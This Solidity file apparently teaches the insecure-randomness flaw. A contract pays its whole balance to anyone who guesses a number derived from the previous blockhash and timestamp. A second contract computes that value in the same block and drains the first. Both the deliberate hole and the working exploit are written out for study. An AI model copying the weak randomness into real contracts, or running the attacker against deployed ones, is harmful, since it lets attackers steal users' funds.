// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract InsecureRandomnessVulnerable {
    constructor() payable {}

    // Guess the correct number to win the entire contract's balance.
    function guess(uint256 _guess) public {
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        if (_guess == answer) {
            (bool success,) = msg.sender.call{value: address(this).balance}("");
            require(success, "Transfer failed.");
        }
    }
}

contract InsecureRandomnessAttacker {
    InsecureRandomnessVulnerable vulnerable;

    constructor(InsecureRandomnessVulnerable _vulnerable) {
        vulnerable = _vulnerable;
    }

    // Guess the correct number to win the entire contract's balance.
    function attack() public payable {
        // Just copy the guess function logic from the vulnerable contract
        // since they are both executed in the same block.
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        vulnerable.guess(answer);
    }

    // Receive function triggers the attack.
    receive() external payable {}
}
